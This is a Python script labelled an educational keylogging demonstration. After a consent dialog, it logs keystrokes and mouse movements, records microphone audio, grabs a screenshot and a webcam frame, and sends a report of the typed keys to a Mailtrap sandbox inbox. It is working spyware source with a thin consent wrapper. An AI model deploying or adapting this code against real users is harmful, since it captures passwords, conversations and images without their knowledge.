import os
import time
import base64
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard, mouse
import pyscreenshot as ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write
import requests
import cv2
import sys

# ===================== CONFIG ======================
DURATION = 10  # seconds
LOG_DIR = "logs"

# Mailtrap Sandbox API
MAILTRAP_API_TOKEN = ""   # <-- PASTE YOUR TOKEN HERE
INBOX_ID = # <-- PASTE YOUR INBOX Id which can be found in the browser URL when an inbox is opened in the Mailtrap Sandbox environment
MAILTRAP_API_URL = f"https://sandbox.api.mailtrap.io/api/send/{INBOX_ID}"

KEY_LOG = f"{LOG_DIR}/keys.txt"
MOUSE_LOG = f"{LOG_DIR}/mouse.txt"
AUDIO_FILE = f"{LOG_DIR}/audio.wav"
SCREENSHOT_FILE = f"{LOG_DIR}/screenshot.png"
WEBCAM_FILE = f"{LOG_DIR}/webcam.jpg"
REPORT_FILE = f"{LOG_DIR}/activity_report.txt"

os.makedirs(LOG_DIR, exist_ok=True)


def get_consent():
    root = tk.Tk()
    root.withdraw()
    consent = messagebox.askyesno(
        "Consent Required",
        "This program records:\n"
        "- Keyboard input\n"
        "- Mouse movement\n"
        "- Screenshot\n"
        "- Microphone audio\n"
        "- Webcam image (single frame)\n\n"
        "For EDUCATIONAL & SECURITY DEMONSTRATION purposes only.\n\n"
        "A report will be generated and a notification\n"
        "will be sent to a Mailtrap Sandbox inbox.\n\n"
        "Do you consent to proceed?"
    )
    root.destroy()
    return consent

# ===================== KEYBOARD ====================
def on_key_press(key):
    with open(KEY_LOG, "a", encoding="utf-8", errors="ignore") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f"[{key}]")

# ===================== MOUSE =======================
def on_move(x, y):
    with open(MOUSE_LOG, "a", encoding="utf-8") as f:
        f.write(f"Move: {x},{y}\n")

# ===================== AUDIO =======================
def record_audio():
    fs = 44100
    recording = sd.rec(int(DURATION * fs), samplerate=fs, channels=1)
    sd.wait()
    write(AUDIO_FILE, fs, recording)

# ===================== SCREENSHOT ==================
def take_screenshot():
    img = ImageGrab.grab()
    img.save(SCREENSHOT_FILE)

# ===================== WEBCAM ======================
def capture_webcam():
    cap = cv2.VideoCapture(0)
    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(WEBCAM_FILE, frame)
    cap.release()

# ===================== REPORT ======================
def generate_activity_report():
    keys_data = ""
    if os.path.exists(KEY_LOG):
        with open(KEY_LOG, "r", encoding="utf-8", errors="ignore") as f:
            keys_data = f.read()

    report = (
        "Endpoint Monitoring Activity Report\n"
        "-----------------------------------\n\n"
        f"Monitoring Duration: {DURATION} seconds\n\n"
        "Keyboard Activity:\n"
        "Keys Pressed:\n"
        f"{keys_data}\n\n"
        "Mouse Activity:\n"
        "Mouse movement logged\n\n"
        "Microphone:\n"
        "Audio recording performed (audio.wav)\n\n"
        "Screenshot:\n"
        "Screenshot captured (screenshot.png)\n\n"
        "Webcam:\n"
        "Single webcam image captured (webcam.jpg)\n"
    )

    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        f.write(report)

    return REPORT_FILE

# ===================== EMAIL (SANDBOX) =============
def send_email_sandbox(report_path):
    print("Sending notification via Mailtrap Sandbox API")

    def encode_file(path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()

    headers = {
        "Authorization": f"Bearer {MAILTRAP_API_TOKEN}",
        "Content-Type": "application/json"
    }
# ===================== Random from & to email credentials are used as they are test-generated emails  =============
    payload = {
        "from": {"email": "sandbox@mailtrap.io"},
        "to": [{"email": "receiver@mailtrap.io"}],
        "subject": "Endpoint Monitoring Simulation Report",
        "text": (
            "Endpoint monitoring simulation completed.\n"
            "An activity report was generated locally."
        ),
        "attachments": [
            {
                "filename": "activity_report.txt",
                "content": encode_file(report_path),
                "type": "text/plain"
            }
        ]
    }

    response = requests.post(
        MAILTRAP_API_URL,
        headers=headers,
        json=payload,
        timeout=15
    )

    if response.status_code == 200:
        print("Mailtrap notification sent")
    else:
        print("Mailtrap API failed")
        print(response.status_code, response.text)

def delete_logs():
    root = tk.Tk()
    root.withdraw()

    confirm = messagebox.askyesno(
        "Delete Logs",
        "This will permanently delete all collected log files:\n\n"
        "- keys.txt\n"
        "- mouse.txt\n"
        "- audio.wav\n"
        "- screenshot.png\n"
        "- webcam.jpg\n"
        "- activity_report.txt\n\n"
        "Do you want to proceed?"
    )

    if not confirm:
        print("ℹ Log deletion cancelled by user.")
        root.destroy()
        return

    deleted_any = False

    log_files = [
        KEY_LOG,
        MOUSE_LOG,
        AUDIO_FILE,
        SCREENSHOT_FILE,
        WEBCAM_FILE,
        REPORT_FILE
    ]

    for file_path in log_files:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                deleted_any = True
        except Exception as e:
            print(f" Failed to delete {file_path}: {e}")

    if deleted_any:
        print("🗑 All log files deleted successfully.")
        messagebox.showinfo(
            "Logs Deleted",
            "All collected log files have been deleted successfully."
        )
    else:
        print("ℹ No log files found to delete.")
        messagebox.showinfo(
            "No Logs Found",
            "No log files were found to delete."
        )

    root.destroy()

def show_help():
    help_text = """
Keylogging Mechanism Demonstration for Cybersecurity
----------------------------------------------------
Educational project demonstrating endpoint monitoring (keyboard, mouse, microphone, screenshot, webcam) with explicit user consent.

Usage:
  python main.py
      Run the monitoring demonstration (consent required)

  python main.py --delete-logs
      Delete all collected log files (confirmation required)

  python main.py --help
      Show this help message and exit

NOTE:
- This project is for educational and cybersecurity awareness purposes only.
- All monitoring actions require explicit user consent.
- Collected data is stored locally in the logs/ directory.
- Email notification is simulated using Mailtrap Sandbox API.
"""
    print(help_text)

def main():
    if not get_consent():
        print("Consent denied. Exiting without performing any monitoring.")
        return

    print("Consent granted")
    print(f"Monitoring started for {DURATION} seconds")

    k_listener = keyboard.Listener(on_press=on_key_press)
    m_listener = mouse.Listener(on_move=on_move)

    k_listener.start()
    m_listener.start()

    record_audio()
    take_screenshot()
    capture_webcam()

    time.sleep(DURATION)

    k_listener.stop()
    m_listener.stop()

    report_path = generate_activity_report()

    print("Sending activity report...")
    send_email_sandbox(report_path)

    print("Simulation completed successfully")

if __name__ == "__main__":
    import sys

    if "--help" in sys.argv:
        show_help()
        sys.exit(0)

    if "--delete-logs" in sys.argv:
        delete_logs()
        sys.exit(0)

    main()

